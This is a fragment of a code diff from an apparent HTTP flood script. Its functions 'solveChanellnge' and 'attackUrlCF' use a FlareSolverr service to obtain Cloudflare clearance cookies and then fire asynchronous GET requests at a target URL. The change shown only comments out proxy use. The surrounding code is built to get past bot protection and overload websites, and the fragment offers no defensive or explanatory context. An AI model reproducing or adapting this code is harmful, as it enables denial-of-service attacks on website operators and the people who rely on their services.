@@ -61,7 +61,7 @@ def solveChanellnge(url):
 			data = {"cmd": "request.get",
 					"url": url,
 					"returnOnlyCookies": True,
-					'proxy': {'url': PROXY_URL},
+					# 'proxy': {'url': PROXY_URL},
 					"maxTimeout": 30000  
 					}
 			resStr = requests.post(flareSolverUrl, json=data).content
@@ -110,7 +110,7 @@ def attackUrlCF(baseUrl, threadNumber):
 
 			requestsArr = []
 			for x in range(1):
-				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
+				requestsArr.append(grequests.get(url, headers=headers))#, proxies=proxies))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
 			isClear = True
